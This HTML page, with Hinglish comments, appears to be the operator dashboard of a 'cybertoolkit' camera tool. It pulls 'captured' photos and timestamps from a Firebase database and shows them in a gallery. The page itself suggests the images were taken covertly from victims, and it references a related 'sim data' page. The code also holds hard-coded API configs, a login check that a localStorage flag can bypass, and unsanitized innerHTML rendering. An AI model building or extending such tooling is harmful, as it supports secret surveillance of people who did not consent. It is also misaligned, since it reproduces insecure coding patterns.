<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Captured Gallery - WE ARE KING</title>
    <style>
        /* Loading & Base Styles */
        body { 
            background: #050505; color: #fff; font-family: 'Poppins', sans-serif; 
            margin: 0; min-height: 100vh; text-align: center;
        }
        #loading-screen {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: #050505; display: flex; align-items: center; justify-content: center; z-index: 1000;
        }
        #gallery-content { display: none; padding: 20px; margin-top: 20px; }
        
        /* Grid Styles */
        .grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
            gap: 20px; padding: 20px;
        }
        .img-card {
            background: #111; border: 1px solid #00e5ff; border-radius: 12px;
            padding: 10px; box-shadow: 0 0 15px rgba(0, 229, 255, 0.2);
            transition: 0.3s;
        }
        .img-card:hover { transform: scale(1.03); box-shadow: 0 0 20px #00e5ff; }
        img { width: 100%; border-radius: 8px; display: block; }
        .time { font-size: 10px; color: #888; margin-top: 8px; display: block; }
        
        .btn-back {
            display: inline-block; padding: 10px 20px; background: #00e5ff;
            color: #000; text-decoration: none; font-weight: bold; border-radius: 5px; margin-bottom: 20px;
        }
    </style>
</head>
<body>

    <!-- Redirection hone tak ye loader dikhega -->
    <div id="loading-screen">
        <div>
            <h2 style="color: #00e5ff;">VERIFYING ACCESS...</h2>
            <p>Scanning King's Database</p>
        </div>
    </div>

    <!-- Gallery content -->
    <div id="gallery-content">
        <h1 style="color: #00e5ff;">CAPTURED PHOTOS</h1>
        <a href="camera-tool.html" class="btn-back">BACK TO DASHBOARD</a>
        <div class="grid" id="photo-grid">
            <!-- Photos will appear here -->
        </div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getAuth, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-auth.js";
        import { getDatabase, ref, onValue } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";

        // 1. MAIN WEBSITE CONFIG (Auth Check karne ke liye)
        const mainSiteConfig = {
            apiKey: "AIzaSyC9z_N93wf9RFzEYZEIlXE8yiCcnJuWC4A",
            authDomain: "cybertoolkit-65b65.firebaseapp.com",
            projectId: "cybertoolkit-65b65",
            storageBucket: "cybertoolkit-65b65.firebasestorage.app",
            appId: "1:412853505695:web:050010f944695ddff41caa"
        };

        // 2. CAMERA TOOL CONFIG (Data uthane ke liye)
        const cameraToolConfig = {
            apiKey: "AIzaSyDyl_AUPvulQJtVPBEeofS0OaWADyO4acw",
            databaseURL: "https://camera-fc58f-default-rtdb.firebaseio.com",
            projectId: "camera-fc58f"
        };

        // Initialize Dono Apps
        const mainApp = initializeApp(mainSiteConfig); // Default app for Auth
        const cameraApp = initializeApp(cameraToolConfig, "cameraApp"); // Named app for Data

        const auth = getAuth(mainApp);
        const db = getDatabase(cameraApp);

        // --- AUTH GUARD LOGIC ---
        onAuthStateChanged(auth, (user) => {
            // Hum localStorage ka check bhi use kar rahe hain jaisa aapne sim data page mein kiya
            if (user || localStorage.getItem("isLoggedIn") === "true") {
                console.log("Access Granted!");
                document.getElementById("loading-screen").style.display = "none";
                document.getElementById("gallery-content").style.display = "block";
                loadPhotos();
            } else {
                console.log("Access Denied. Redirecting...");
                window.location.href = "index.html";
            }
        });

        function loadPhotos() {
            const grid = document.getElementById('photo-grid');
            const capturesRef = ref(db, 'captures');

            onValue(capturesRef, (snapshot) => {
                const data = snapshot.val();
                grid.innerHTML = ''; // Reset grid

                if (!data) {
                    grid.innerHTML = '<p style="color:#888;">No photos captured yet.</p>';
                    return;
                }

                // Reverse loop taake latest photo pehle nazar aaye
                const items = Object.keys(data).reverse();
                items.forEach(id => {
                    const record = data[id];
                    const card = document.createElement('div');
                    card.className = 'img-card';
                    card.innerHTML = `
                        <img src="${record.image}" alt="Captured">
                        <span class="time">${new Date(record.time).toLocaleString()}</span>
                    `;
                    grid.appendChild(card);
                });
            });
        }
    </script>
</body>
</html>
